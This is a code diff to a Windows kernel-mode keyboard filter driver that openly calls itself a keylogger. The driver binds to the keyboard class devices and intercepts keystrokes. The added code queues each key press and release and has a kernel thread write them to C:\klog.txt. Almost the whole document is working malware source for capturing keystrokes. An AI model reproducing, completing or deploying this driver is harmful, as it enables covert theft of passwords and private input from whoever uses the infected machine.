@@ -1,6 +1,7 @@
 #include "KeyLoger.h"
 #include <ntddk.h>
 #include <ntddkbd.h>
+#include <Ntstrsafe.h>
 
 //扫描码与虚拟键的对应： 
 unsigned char asciiTbl[] = {
@@ -85,6 +86,7 @@ void DriverUnload(PDRIVER_OBJECT DriverObject)
 	DbgPrint(("Keyloger unload enter\n"));
 	LARGE_INTEGER DelayTime;
 	PDEVICE_OBJECT pDevice = DriverObject->DeviceObject;
+	NTSTATUS ntRet = STATUS_UNSUCCESSFUL;
 
 	DelayTime = RtlConvertLongToLargeInteger(-(100 * 10000));
 
@@ -100,6 +102,24 @@ void DriverUnload(PDRIVER_OBJECT DriverObject)
 	{
 		KeDelayExecutionThread(KernelMode, FALSE, &DelayTime);
 	}
+
+	g_pThreadContext->bTerminate = TRUE;
+
+	//这里需要释放一个信号
+	KeReleaseSemaphore(&g_pThreadContext->semLock,
+		0,
+		1,
+		FALSE);
+
+	//等待线程退出
+	ntRet = KeWaitForSingleObject(&g_pThreadContext->pThreadObj,
+		Executive,
+		KernelMode,
+		FALSE,
+		NULL);
+
+	//关闭日志文件
+	ZwClose(g_pThreadContext->hLogFile);
 
 	//删除设备
 	IoDeleteDevice(DriverObject->DeviceObject);
@@ -149,6 +169,25 @@ MyKeyLogerReadIoCompletion(
 				if (keys[i].Flags == KEY_MAKE) {
 					DbgPrint("键盘 %c %s", ch, "按下");
 				}
+
+				//申请空间
+				PKEYDATA pKeyData = (PKEYDATA)ExAllocatePool(NonPagedPool,
+					sizeof(KEYDATA));
+
+				pKeyData->Flags = keys[i].Flags;
+				pKeyData->MakeCode = keys[i].MakeCode;
+				pKeyData->ch = ch;
+
+				//添加进队列尾,该函数利用了自旋锁做同步
+				ExInterlockedInsertTailList(&g_pThreadContext->keyLst,
+					&pKeyData->LstEntry,
+					&g_pThreadContext->spinLock);
+
+				//释放一个信号量
+				KeReleaseSemaphore(&g_pThreadContext->semLock,
+					0,
+					1,
+					FALSE);
 			}
 		}
 	}
@@ -213,6 +252,7 @@ CreateAndBindDevice(PDRIVER_OBJECT DriverObject)
 
 	//初始化
 	RtlInitUnicodeString(&usDeviceName, L"\\Device\\myKeyloger");
+
 	//这里使用工具devicetree来获取设备名
 	RtlInitUnicodeString(&usPreDeviceName, L"\\Device\\KeyboardClass0");
 	RtlInitUnicodeString(&usDriverName, L"\\Driver\\kbdclass");
@@ -281,7 +321,6 @@ CreateAndBindDevice(PDRIVER_OBJECT DriverObject)
 
 		//绑定下一个
 		pTargetDeviceObj = pTargetDeviceObj->NextDevice;
-
 	}
 
 SAFE_EXIT:
@@ -307,10 +346,6 @@ InitKeylogger(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 
 	DriverObject->MajorFunction[IRP_MJ_READ] = MyDispatchRead;
 
-	//创建并绑定设备
-	CreateAndBindDevice(DriverObject);
-
-
 	return STATUS_SUCCESS;
 }
 
@@ -319,9 +354,66 @@ MyKeyThreadProc(
 	__in PVOID StartContext
 )
 {
+	//从队列中摘出一个消息，然后写文件，这里使用了信号灯
+	PTHREADCONTEXT pThreadContext = (PTHREADCONTEXT)StartContext;
+	NTSTATUS nt_ret = STATUS_UNSUCCESSFUL;
+	int arraysize = 30;
+	CHAR pszDest[30];
+	size_t cbDest = arraysize * sizeof(CHAR);
+	IO_STATUS_BLOCK io_block;
+
+	while (TRUE)
+	{
+		nt_ret = KeWaitForSingleObject(&pThreadContext->semLock,
+			Executive,
+			KernelMode,
+			FALSE,
+			NULL);
+
+		if (!NT_SUCCESS(nt_ret)){
+			return nt_ret;
+		}
+
+		//表示线程需要退出了
+		if (pThreadContext->bTerminate){
+			PsTerminateSystemThread(STATUS_SUCCESS);
+		}
+
+		//表示队列中有一项数据需要写文件了,因为是尾部插入，所以从头部读取
+		PLIST_ENTRY pLstItem = ExInterlockedRemoveHeadList(&pThreadContext->keyLst,
+			                       &pThreadContext->spinLock);
+		if (pLstItem == NULL){
+			continue;
+		}
+
+		//取出数据项，开始写文件
+		PKEYDATA pKeyData = CONTAINING_RECORD(pLstItem, KEYDATA, LstEntry);
+		if (pThreadContext->hLogFile != NULL){
+
+			RtlStringCbPrintfA(pszDest, arraysize, "键盘 %c %s", pKeyData->ch, pKeyData->Flags == KEY_MAKE ? "按下" : "弹起");
+
+			//写文件
+			nt_ret = ZwWriteFile(pThreadContext->hLogFile,
+				        NULL,
+				        NULL,
+				        NULL,
+				        &io_block,
+				        pszDest,
+				        strlen(pszDest),
+				        NULL,
+				        NULL);
+
+			if (NT_SUCCESS(nt_ret)){
+				DbgPrint("%s 成功写文件!\r\n", pszDest);
+			}
+		}
+
+		//释放内存
+		ExFreePool(pKeyData);
+	}
 
 	return;
-}
+}	
 
 
 /*
@@ -338,11 +430,80 @@ InitKeyloggerThread(PDRIVER_OBJECT DriverObject)
 		(HANDLE)0,
 		NULL,
 		(PKSTART_ROUTINE)MyKeyThreadProc, 
-		);
+		g_pThreadContext);
 
+	if (!NT_SUCCESS(ntRet)){
+		return ntRet;
+	}
 
+	//获取线程对象Object
+	ntRet = ObReferenceObjectByHandle(threadHandle,
+		                     THREAD_ALL_ACCESS,
+		                     NULL,
+		                     KernelMode,
+		                     (PVOID*)&g_pThreadContext->pThreadObj,
+		                     NULL);
 
+	if (!NT_SUCCESS(ntRet)) {
+		return ntRet;
+	}
 
-
+	//关闭线程句柄
+	ZwClose(threadHandle);
 	return STATUS_SUCCESS;
+}
+
+/*
+*  初始化线程回调函数中的各参数
+*  例如 信号灯， 锁
+*/
+NTSTATUS
+InitKeyloggerEnv(PDRIVER_OBJECT DriverObject)
+{
+	NTSTATUS ntRet;
+	OBJECT_ATTRIBUTES obj_attrib;
+	IO_STATUS_BLOCK file_status;
+
+	UNICODE_STRING usFileName = { 0 };
+	RtlInitUnicodeString(&usFileName, L"\\DosDevices\\C:\\klog.txt");
+
+	g_pThreadContext = (PTHREADCONTEXT)ExAllocatePool(NonPagedPool,
+		sizeof(THREADCONTEXT));
+
+
+	//初始化自旋锁
+	KeInitializeSpinLock((PKSPIN_LOCK)&g_pThreadContext->spinLock);
+
+	//初始化信号灯
+	KeInitializeSemaphore((PRKSEMAPHORE)&g_pThreadContext->semLock,
+		                 0,
+		                 MAXLONG);
+
+	//初始化链表头节点
+	InitializeListHead(&g_pThreadContext->keyLst);
+
+
+	InitializeObjectAttributes(&obj_attrib,
+		&usFileName,
+		OBJ_CASE_INSENSITIVE,
+		NULL,
+		NULL);
+
+	g_pThreadContext->bTerminate = FALSE;
+
+	//打开文件
+	ntRet = ZwCreateFile((PHANDLE)&g_pThreadContext->hLogFile,
+		GENERIC_WRITE,
+		&obj_attrib,
+		&file_status,
+		NULL,
+		FILE_ATTRIBUTE_NORMAL,
+		0,
+		FILE_OPEN_IF,
+		FILE_SYNCHRONOUS_IO_NONALERT,
+		NULL,
+		0);
+
+
+	return ntRet;
 }
